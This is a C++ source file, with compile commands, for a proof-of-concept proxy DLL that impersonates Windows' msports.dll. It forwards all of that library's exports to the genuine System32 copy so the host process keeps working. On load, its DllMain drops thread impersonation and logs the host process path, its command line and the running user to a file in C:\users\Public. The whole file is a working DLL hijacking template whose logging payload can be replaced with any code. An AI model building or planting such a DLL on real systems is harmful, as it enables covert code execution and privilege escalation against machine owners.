// c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat
// cl.exe /D_USRDLL /D_WINDLL /MT /Tc raw.cpp /link /DLL /out:raw.dll /SUBSYSTEM:WINDOWS /MACHINE:x64
#pragma comment(linker, "/export:ComDBClaimNextFreePort=C:\\Windows\\System32\\msports.ComDBClaimNextFreePort,@1")
#pragma comment(linker, "/export:ComDBClaimPort=C:\\Windows\\System32\\msports.ComDBClaimPort,@2")
#pragma comment(linker, "/export:ComDBClose=C:\\Windows\\System32\\msports.ComDBClose,@3")
#pragma comment(linker, "/export:ComDBGetCurrentPortUsage=C:\\Windows\\System32\\msports.ComDBGetCurrentPortUsage,@4")
#pragma comment(linker, "/export:ComDBOpen=C:\\Windows\\System32\\msports.ComDBOpen,@5")
#pragma comment(linker, "/export:ComDBReleasePort=C:\\Windows\\System32\\msports.ComDBReleasePort,@6")
#pragma comment(linker, "/export:ComDBResizeDatabase=C:\\Windows\\System32\\msports.ComDBResizeDatabase,@7")
#pragma comment(linker, "/export:ParallelPortPropPageProvider=C:\\Windows\\System32\\msports.ParallelPortPropPageProvider,@8")
#pragma comment(linker, "/export:PortsClassInstaller=C:\\Windows\\System32\\msports.PortsClassInstaller,@9")
#pragma comment(linker, "/export:SerialDisplayAdvancedSettings=C:\\Windows\\System32\\msports.SerialDisplayAdvancedSettings,@10")
#pragma comment(linker, "/export:SerialPortPropPageProvider=C:\\Windows\\System32\\msports.SerialPortPropPageProvider,@11")
// This time we do need a proper proxy DLL, hence pragmas above. We are proxying msports.dll.

#include <windows.h>
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		RevertToSelf(); // if possible, revert the impersonation of the current thread
		char user_name[104];
		memcpy(user_name, "", 104);
		char module_fname[MAX_PATH];
		memcpy(module_fname, "", MAX_PATH);
		LPSTR command_line = GetCommandLineA();
		GetModuleFileNameA(NULL, module_fname, MAX_PATH);
		HANDLE hFile = CreateFileA("C:\\users\\Public\\poc.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		DWORD max_user_name = 104;
		GetUserNameA(user_name, &max_user_name);

		DWORD bytesWritten; char lf[] = "\n"; char left_bracket[] = " [ "; char right_bracket[] = " ] ";
		if (hFile != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(hFile, 0, NULL, FILE_END);
			WriteFile(hFile, module_fname, strlen(module_fname), &bytesWritten, NULL);
			WriteFile(hFile, left_bracket, strlen(left_bracket), &bytesWritten, NULL);
			WriteFile(hFile, command_line, strlen(command_line), &bytesWritten, NULL);
			WriteFile(hFile, right_bracket, strlen(left_bracket), &bytesWritten, NULL);
			WriteFile(hFile, left_bracket, strlen(left_bracket), &bytesWritten, NULL);
			WriteFile(hFile, user_name, strlen(user_name), &bytesWritten, NULL);
			WriteFile(hFile, right_bracket, strlen(left_bracket), &bytesWritten, NULL);
			WriteFile(hFile, lf, 1, &bytesWritten, NULL);
			CloseHandle(hFile);
		}
	}
	return TRUE;
}

